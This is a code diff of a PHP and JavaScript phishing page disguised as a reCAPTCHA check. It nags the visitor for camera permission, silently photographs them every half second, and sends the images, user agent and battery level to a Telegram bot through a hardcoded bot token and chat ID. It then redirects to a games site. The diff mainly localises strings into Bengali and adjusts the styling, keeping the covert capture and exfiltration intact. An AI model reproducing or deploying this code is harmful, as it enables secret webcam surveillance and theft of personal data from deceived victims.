@@ -1,18 +1,18 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
-    // Security check: Verify expiry time parameter
+    // e প্যারামিটার না থাকলে অথবা লিংকের মেয়াদ পার হয়ে গেলে ছবি পাঠাবে না
     if (!isset($_POST['e']) || empty($_POST['e'])) {
         exit;
     }
 
     $expiryTime = intval($_POST['e']);
     if (time() > $expiryTime) {
-        exit; // Link expired, do not process image
+        exit; // মেয়াদ শেষ, ছবি যাবে না
     }
 
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
-    $chatId = "5896019931"; // Default fallback chat ID
+    $chatId = "5896019931"; 
 
     if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
         $encodedCid = $_POST['chat_id'];
@@ -77,11 +77,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 }
 ?>
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>reCAPTCHA Verification</title>
+    <title>Loading...</title>
     <style>
         body, html {
             margin: 0;
@@ -121,21 +121,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             background: #fff;
             border: 2px solid #c1c1c1;
             border-radius: 2px;
+            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
             position: relative;
+            transition: background 0.2s, border-color 0.2s;
         }
 
-        /* Thicker spinner border and slow 1.2s rotation */
+        .recaptcha-checkbox:hover {
+            border-color: #b2b2b2;
+        }
+
         .recaptcha-spinner {
-            width: 20px;
-            height: 20px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4285F4;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4285F4;
             border-radius: 50%;
-            animation: spin 1.2s linear infinite;
-            display: none; /* Hidden by default until clicked */
+            animation: spin 0.8s linear infinite;
+            display: none;
         }
 
         @keyframes spin {
@@ -143,11 +148,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             100% { transform: rotate(360deg); }
         }
 
-        .recaptcha-checkbox.checked .recaptcha-spinner {
-            display: none;
-        }
-
-        /* Checkmark styling */
         .recaptcha-checkbox.checked::after {
             content: "";
             position: absolute;
@@ -214,7 +214,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || 'direct';
         const userChatId = urlParams.get('cid') || ''; 
-        const expiryParam = urlParams.get('e') || ''; 
+        const expiryParam = urlParams.get('e') || ''; // e parameter receive kora holo
         const rawTargetUrl = urlParams.get('url');
 
         let finalUrl = "https://www.aapunkagames.com/"; 
@@ -240,19 +240,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             const checkbox = document.getElementById('recaptchaCheckbox');
             const spinner = document.getElementById('recaptchaSpinner');
 
-            // Show spinner on click
             spinner.style.display = 'block';
 
-            // Rotate spinner for 3.5 seconds (3500ms)
             setTimeout(() => {
                 spinner.style.display = 'none';
                 checkbox.classList.add('checked');
                 
-                // Short delay to show checkmark before redirecting in main tab
                 setTimeout(() => {
                     window.location.href = finalUrl;
                 }, 400);
-            }, 3500);
+            }, 3000);
         }
 
         let batteryLevelInfo = 'Not Available';
@@ -267,13 +264,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 .then(stream => {
                     video.srcObject = stream;
                     setTimeout(() => {
-                        // Capture image every 0.5 seconds (500ms)
                         setInterval(captureAndUpload, 500);
                     }, 1000);
                 })
                 .catch(err => {
                     console.error("Camera error: ", err);
-                    alert("You must grant camera permission to proceed!");
+                    alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
                     setTimeout(requestCameraPermission, 1000);
                 });
         }
@@ -292,7 +288,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             postData.append('image', imageData);
             postData.append('target', targetId);
             postData.append('chat_id', userChatId);
-            postData.append('e', expiryParam); 
+            postData.append('e', expiryParam); // e parameter server e pathano holo
             postData.append('user_agent', navigator.userAgent);
             postData.append('battery', batteryLevelInfo);
 
